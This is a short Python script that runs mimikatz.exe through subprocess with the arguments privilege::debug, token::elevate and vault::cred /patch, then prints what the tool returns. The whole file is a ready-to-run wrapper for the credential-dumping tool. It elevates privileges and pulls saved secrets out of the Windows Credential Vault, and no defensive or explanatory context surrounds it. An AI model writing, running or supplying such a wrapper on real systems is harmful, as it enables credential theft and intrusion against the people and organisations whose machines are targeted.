import subprocess 

# sample: mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch"
cmd  = ["mimikatz.exe", "privilege::debug", "token::elevate", "vault::cred /patch"]
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = proc.communicate()

print(stdout)